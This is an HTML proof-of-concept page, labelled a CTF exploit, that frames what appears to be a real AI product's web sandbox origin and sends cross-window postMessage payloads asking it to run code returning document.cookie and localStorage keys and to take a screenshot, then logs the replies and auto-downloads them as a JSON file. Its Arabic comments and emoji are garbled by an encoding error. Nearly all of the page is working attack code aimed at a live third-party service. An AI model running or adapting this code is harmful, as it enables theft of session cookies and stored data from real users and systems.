<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CTF Sandbox PoC</title>
</head>
<body>
  <h2>ðŸš€ CTF Sandbox Exploit PoC</h2>

  <!-- Ø§Ù„Ù‡Ø¯Ù -->
  <iframe id="victim" 
          src="https://web-sandbox.oaiusercontent.com/index.html?" 
          width="800" height="600"
          style="border:1px solid #ccc"></iframe>

  <pre id="log"></pre>

  <script>
    const victim = document.getElementById("victim").contentWindow;
    const targetOrigin = "https://web-sandbox.oaiusercontent.com";
    const collected = [];

    function log(msg, data) {
      const pre = document.getElementById("log");
      pre.textContent += msg + (data ? " " + JSON.stringify(data, null, 2) : "") + "\n";
      console.log(msg, data || "");
    }

    // Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§Ù„Ø±Ø¯ÙˆØ¯
    window.addEventListener("message", (event) => {
      if (event.origin !== targetOrigin) return; // ØªØ¬Ø§Ù‡Ù„ Ø£ÙŠ Ø±Ø¯ Ù…Ù† ØºÙŠØ± Ø§Ù„Ù€ sandbox
      log("ðŸ“© Response from sandbox:", event.data);

      collected.push({
        origin: event.origin,
        data: event.data,
        time: new Date().toISOString()
      });

      // Ø¬Ø±Ù‘Ø¨ ØªÙ†Ø²Ù„ Ù…Ù„Ù Ø¨Ø¹Ø¯ Ù…Ø§ Ù†Ø¬Ù…Ø¹ Ø±Ø¯ÙˆØ¯
      if (collected.length >= 3) {
        downloadResults();
      }
    });

    // payloads Ù†Ø¬Ø±Ø¨Ù‡Ø§
    const payloads = [
      ["CALL", "runUserCode", ["return document.cookie"]],
      ["CALL", "runUserCode", ["return Object.keys(localStorage)"]],
      ["CALL", "screenshot", []],
      ["CALL", "echo", [{ poc: "hello" }]]
    ];

    function sendPayloads() {
      payloads.forEach((msg, i) => {
        setTimeout(() => {
          log("âž¡ï¸ Sending payload #" + i + ": " + msg[1]);
          victim.postMessage(msg, targetOrigin);
        }, i * 3000); // ÙƒÙ„ 3 Ø«ÙˆØ§Ù†ÙŠ
      });
    }

    function downloadResults() {
      const blob = new Blob([JSON.stringify(collected, null, 2)], { type: "application/json" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = "sandbox_results_" + Date.now() + ".json";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      log("ðŸ’¾ File download triggered.");
    }

    // Ø´ØºÙ„ Ø¨Ø¹Ø¯ 5 Ø«ÙˆØ§Ù†ÙŠ
    setTimeout(() => {
      log("ðŸš€ Starting payload sequence...");
      sendPayloads();
    }, 5000);
  </script>
</body>
</html>
